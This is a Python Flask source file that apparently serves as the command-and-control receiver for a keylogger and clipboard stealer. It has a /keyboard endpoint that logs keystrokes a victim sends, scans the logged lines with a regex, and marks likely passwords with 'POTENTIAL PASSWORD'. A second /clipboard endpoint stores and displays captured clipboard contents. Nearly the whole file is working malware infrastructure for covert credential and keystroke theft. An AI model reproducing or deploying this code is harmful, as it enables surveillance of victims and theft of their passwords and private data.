from flask import Flask, request, render_template
import re
# regex values that identify a potential password
pass1 = re.compile(r'[a-z]')
pass2 = re.compile(r'[A-Z]')
pass3 = re.compile(r'[0-9]')
pass4 = re.compile(r'[@$!%*?]')

app = Flask(__name__)

@app.route('/keyboard', methods=['GET','POST'])
def receive_data():
    global whole_text
    whole_text=''
    if request.method == 'POST':
        data = request.data.decode('utf-8')

        # Handle the data as needed
        with open('received_data.txt', 'a') as file:
            file.write(str(data))

        return render_template('index.html', received_data=data)
    else:
        # Read contents from the file
        with open('received_data.txt', 'r') as file:
            data_from_file = file.readlines()
            for data in data_from_file:
                if isPassword(data):
                    whole_text+= '<span class="password_text">' + data + " <-- POTENTIAL PASSWORD</span><br>"
                else:
                    whole_text+=data+'<br>'
        whole_text=whole_text.replace(r'\x03','<CTRL+C>')
        return render_template('index.html', received_data=whole_text)

@app.route('/clipboard', methods=['GET','POST'])
def getClipboard():
      if request.method == 'POST':
        data = request.data.decode('utf-8')
        with open('received_clipboard.txt', 'w') as file:
            file.write(str(data))
        with open('received_clipboard.txt', 'r') as file:
            info = file.read()
        return render_template('index.html', received_clipboard=info)
      else:
         with open('received_clipboard.txt', 'r') as file:
            info = file.read()
         return render_template('index.html', received_clipboard=info)

def isPassword(line):
    if pass1.search(line) and  pass2.search(line) and  pass3.search(line)  and  pass4.search(line):
        return True
    return False 

if __name__ == '__main__':
    
    app.run(debug=True)
